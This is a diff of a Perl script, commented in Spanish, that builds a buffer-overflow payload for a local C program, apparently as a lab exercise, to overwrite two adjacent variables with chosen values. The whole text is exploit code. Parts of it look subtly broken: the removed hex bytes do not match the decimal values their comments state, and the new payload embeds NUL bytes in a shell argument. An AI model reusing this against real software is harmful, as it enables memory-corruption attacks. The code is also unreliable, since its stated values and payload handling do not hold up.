@@ -1,12 +1,21 @@
 #!/usr/bin/perl
 
-use strict;
-use warnings;
+# Valores específicos para val1 y val2
+my $val1 = 1818390343;
+my $val2 = 1917480553;
 
-my $shellcode = "\x41" x (0x4030 - 0x4028);  # Relleno para llegar a la dirección de val1
-my $val1 = "\xd7\x06\x5d\x06";  # Nuevo valor para val1: 1818390343
-my $val2 = "\x59\x71\x6f\x72";  # Nuevo valor para val2: 1917480553
+# Convertir los valores a formato little endian
+my $val1_le = pack('L<', $val1);
+my $val2_le = pack('L<', $val2);
 
-# Construir el comando para ejecutar el programa y pasar el payload
-my $command = "./prog1 \"" . $shellcode . $val1 . $val2 . "\"";
-system($command);
+# Construir el payload para el desbordamiento de búfer
+my $payload = pack('C*', (0) x 8);     # Rellena el buffer con 8 bytes nulos
+$payload .= $val1_le;                  # Agrega el valor de val1 en formato little endian
+$payload .= $val2_le;                  # Agrega el valor de val2 en formato little endian
+
+# Ejecutar el programa C con el payload como argumento
+my $programa = './mi_programa';        # Ruta al programa compilado
+my $comando = "$programa \"$payload\""; # Comando para ejecutar el programa con el payload
+my $resultado = `$comando`;
+
+print $resultado;
